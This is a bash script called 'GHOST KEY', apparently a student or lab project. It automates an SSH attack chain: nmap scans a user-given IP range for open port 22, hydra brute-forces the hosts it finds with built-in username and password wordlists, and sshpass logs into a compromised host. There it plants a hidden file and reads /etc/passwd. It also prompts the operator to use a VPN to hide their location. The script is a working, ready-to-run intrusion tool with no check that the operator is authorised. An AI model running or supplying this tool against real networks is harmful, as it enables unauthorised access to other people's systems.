#!/bin/bash
#made by e d e n 
#############################################
#Color codes 
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
UNDERLINE='\033[4m'
LIGHT_BLUE='\033[1;36m'
NC='\033[0m' # no color
############################################

function IP() #getting the ip/range from the user and warning the user he should have a vpn
{
echo -e "${RED}BE AWARE you should be using a vpn "
ip=$(curl -s ifconfig.me)
echo -e "your location is :$(geoiplookup $ip)${NC}" #scaning the user ip to warn him about vpn
read -p $'\e[1;33mIF YOU WISH TO CONTINUE PRESS ENTER./TO EXIT PRESS CTRL + C:\e[0m' 
echo ""
read -p $'\e[1;33mGREAT! Please insert an IP range or subnet to scan:\e[0m' RANGE #asks the user for the ip and the range 
echo -e "${GREEN}${UNDERLINE}Checking if the ip is Valid "
NMAPCHECK=$(nmap -sL $RANGE 2>/dev/null | head -n 2 | tail -n 1 | awk '{print $2}') #checks if its a valid ip and range

if [ "$NMAPCHECK" == "scan" ] #checking if the ip is valid 
then 
echo -e "${GREEN}Valid address, we can move on"
else 
echo -e "${RED}Invalid address..."
echo -e "${RED}exiting...."
sleep 2 #wait 2 seconds
exit 
fi
}
#interface
echo -e "${LIGHT_BLUE}###################################################${NC}"
echo -e "${YELLOW}$(figlet 'GHOST KEY')${NC}"
echo -e "${LIGHT_BLUE}###################################################${NC}"
echo -e "${RED}${BOLD}WARNING: This tool requires the following packages:${NC}"
echo -e "${YELLOW}  - nmap${NC}"
echo -e "${YELLOW}  - hydra${NC}"
echo -e "${YELLOW}  - sshpass${NC}"
echo -e "${YELLOW}  - cowsay${NC}"
echo ""
echo -e "${RED}Make sure all packages are installed before continuing.${NC}"
echo -e "${LIGHT_BLUE}###################################################${NC}"
function SCAN()#scaning the ip and the range to find any ssh ports open
{
	echo -e "${BLUE}${UNDERLINE}Checking which ips have an ssh port open:${NC}"
	nmap $RANGE -p 22 --open -Pn | grep report | awk '{print $NF}' > ssh__ips # scans the range and extracts the ip address
	if [ ! -s ssh__ips ]; then
		echo -e "${RED}----------------------------------------${NC}"
		echo -e "${RED}✗ No IPs with SSH port 22 open found!${NC}"
		echo -e "${RED}----------------------------------------${NC}"
		echo -e "${YELLOW}Possible reasons:${NC}"
		echo -e "${YELLOW}  - No hosts are up in the range${NC}"
		echo -e "${YELLOW}  - SSH is not running on port 22${NC}"
		echo -e "${YELLOW}  - Hosts are blocking port scans${NC}"
		echo ""
		echo -e "${RED}Exiting...${NC}"
		exit 1
	fi
	
	echo -e "${BLUE}IPS with ssh open${NC}" #SHOW the ips with ssh open
	cat ssh__ips
	
}


function NAMES()#name list for the brute force 
{
	read -p $'\e[1;33mEnter a username list, use full path(or press enter for default userlist):\e[0m' NAMELIST #which user wordlist user wants to use 
	if [ -z "$NAMELIST" ]
	then 
	echo -e "${GREEN}Using the default userlist${NC}"
	echo -e "${LIGHT_BLUE}################################################################${NC}"
	cat > ssh_userlist << CLOSE #wordlist for brute force 
msfadmin
user
kali
root
admin
doron
administrator
test
guest
mysql
tomcat
CLOSE
      #under this checking if the file is valid 
 else
      if [ -f "$NAMELIST" ]
      
      then
      cp "$NAMELIST" ssh_userlist #trasnfering the file data to a diffrent name so we can continue the script
      echo -e "${GREEN}Username list loaded successfully${NC}"
    else #if the user file is not valid it will use the default list
        echo -e "${RED}Error: File not found or invalid${NC}"
        echo -e "${GREEN}Using default username list instead${NC}"
     cat > ssh_userlist << CLOSE #wordlist for brute force 
msfadmin
user
kali
root
admin
doron
administrator
test
guest
mysql
tomcat
CLOSE
     
     fi
     
      
      fi   
 } 
 
function PASSWORD()#password list for the brute force 
{
	read -p $'\e[1;33mEnter a password list, use full path(or press enter for default passwordlist):\e[0m' PASSLIST #which user wordlist user wants to use 
	if [ -z "$PASSLIST" ]
	then 
	echo -e "${GREEN}Using the default passwordlist${NC}"
	echo -e "${LIGHT_BLUE}################################################################${NC}"
	cat > ssh_passlist << CLOSE #passlist for brute force 
msfadmin
user
kali
password
123456
root
admin
doron
12345678
toor
pass
raspberry
alpine
changeme
CLOSE
      #under this checking if the file is valid 
 else
      if [ -f "$PASSLIST" ]
      
      then
      cp "$PASSLIST" ssh_passlist #trasnfering the file data to a diffrent name so we can continue the script
      echo -e "${GREEN}Password list loaded successfully${NC}"
    else #if the user file is not valid it will use the default list
        echo -e "${RED}Error: File not found or invalid${NC}"
        echo -e "${GREEN}Using default username list instead${NC}"
     cat > ssh_passlist << CLOSE #passlist for brute force 
msfadmin
user
kali
password
123456
root
admin
doron
12345678
toor
pass
raspberry
alpine
changeme
CLOSE
     
     fi
     
      
      fi   
 } 


function ATTACK()#brute froce part 
{
	echo -e "${RED}"
cowsay -f daemon "brute forceing:"
echo -e "${NC}"
 echo -e "${YELLOW}BE AWARE this part will take time sit back and relax: ${NC}"
	hydra -I -L ssh_userlist -P ssh_passlist ssh -M ssh__ips 2>/dev/null | grep host > ssh_hydra
                                                                          #This list will be the list of the successfull attempts
    # Checks if hydra found anything
	if [ ! -s ssh_hydra ]; then
	    echo -e "${RED}----------------------------------------${NC}"
	    echo -e "${RED}✗ No successful SSH logins found!${NC}"
	    echo -e "${RED}----------------------------------------${NC}"
	    echo -e "${YELLOW}Possible reasons:${NC}"
	    echo -e "${YELLOW}  - Wrong credentials in wordlists${NC}"
	    echo -e "${YELLOW}  - SSH ports may be protected${NC}"
	    echo -e "${YELLOW}  - Try different wordlists${NC}"
	    echo ""
	    echo -e "${RED}Exiting...${NC}"
	    exit 1
	fi
    
    
    
    echo -e "${GREEN}Successfull attempts are:${NC}"
    cat ssh_hydra
    #creates variables and gives the user the choice to which ip with whcih user he wants to conenct with
    echo -e "${YELLOW}CHOOSE from the list above ${NC}"
    read -p $'\e[1;33mEnter the ip you want me to connect to:\e[0m' SSHIP  #First successfull IP
    read -p $'\e[1;33mEnter the user you want me to use:\e[0m' SSHUSER #First successfull USER
    read -p $'\e[1;33mEnter the password you want me to use:\e[0m' SSHPASS #First successfull PASSWORD
   
    
}
 

function POC()#connection to the server 
{
 
    echo -e "${LIGHT_BLUE}"
cowsay -f tux "Entering the ssh server:" #user update ssh in
   
    echo "USED IP: |$SSHIP|"
    echo "USED USER: |$SSHUSER|"
    echo "USED PASS: |$SSHPASS|"
    
echo -e "${LIGHT_BLUE}###################################################${NC}"
echo -e "${YELLOW}$(figlet 'summary')${NC}"
echo -e "${LIGHT_BLUE}###################################################${NC}"
    echo ""
    echo -e "${LIGHT_BLUE}Last line in the passwd file of $SSHIP:${NC}" #sum
    #connect to the ssh and show us the last like and creates a hidden file 
    echo $(sshpass -p "$SSHPASS" ssh -o StrictHostKeyChecking=no "$SSHUSER"@"$SSHIP" "echo 'Accessed by Ghost Key' > /home/$SSHUSER/.ghost_key_poc && cat /etc/passwd | tail -n 1")
    echo ""
    echo -e "${LIGHT_BLUE}Created a hidden file at /home/$SSHUSER ${NC}" #sum
    echo ""
    echo -e "${LIGHT_BLUE}all ips with ssh port open${NC}" #sum
    echo -e "${LIGHT_BLUE}$(cat ssh__ips) ${NC}"
    echo ""
    echo -e "${LIGHT_BLUE}Successfully compromised users${NC}" #sum
    echo -e "${LIGHT_BLUE}$(cat ssh_hydra) ${NC}"
    echo ""
    echo -e "${LIGHT_BLUE}Scan completed at: $(date)${NC}" #sum

}

function REPORT()#sum up of all the script # didnt use it at the end have it here for backup
{
echo -e "${LIGHT_BLUE}###################################################${NC}"
echo -e "${YELLOW}$(figlet 'summary')${NC}"
echo -e "${LIGHT_BLUE}###################################################${NC}"
echo ""
echo -e "${LIGHT_BLUE}Created a hidden file at /home/$SSHUSER ${NC}"
echo ""
echo -e "${LIGHT_BLUE}all ips with ssh port open${NC}"
echo -e "${LIGHT_BLUE}$(cat ssh__ips) ${NC}"
echo ""
echo -e "${LIGHT_BLUE}Successfully compromised users${NC}"
echo -e "${LIGHT_BLUE}$(cat ssh_hydra) ${NC}"
}




#checks if the user have the tools 
read -p $'\e[1;33mIF you dont have the required tools type no to install if you do type yes to start (yes/no): \e[0m' answer

if [ "${answer,,}" == "yes" ] #if user types yes and he has all the tools the script will start 
then 
IP
SCAN
echo ""
NAMES
PASSWORD
ATTACK
POC

elif [ "${answer,,}" == "no" ] #if user has no tools it will install them 
then 
echo -e "${GREEN}Please enter the sudo password to acquire the required tools:${NC}"


sudo apt-get install -qq -y nmap 2>/dev/null #nmap installl
echo -e "${YELLOW}Installing nmap:${NC}"
echo ""
echo -e "${YELLOW}Installing sshpass:${NC}" 
sudo apt-get install -qq -y sshpass 2>/dev/null #sshpass install 
echo ""
echo -e "${YELLOW}Installing hydra:${NC}"
sudo apt-get install -qq -y hydra 2>/dev/null #hydra install 
echo ""
echo -e "${YELLOW}Installing cowsay:${NC}"
sudo apt-get install -qq -y cowsay 2>/dev/null
echo -e "${GREEN}Done!now please rerun the script${NC}"
else #if users decides to not answer the question
echo -e "${LIGHT_BLUE}"
cowsay -f ghostbusters "THATS NOT WHAT I ASKED"
echo -e "${NC}"

fi
#removes the files the script makes 
rm ssh__ips 2>/dev/null
rm ssh_passlist 2>/dev/null 
rm ssh_userlist 2>/dev/null
rm ssh_hydra 2>/dev/null
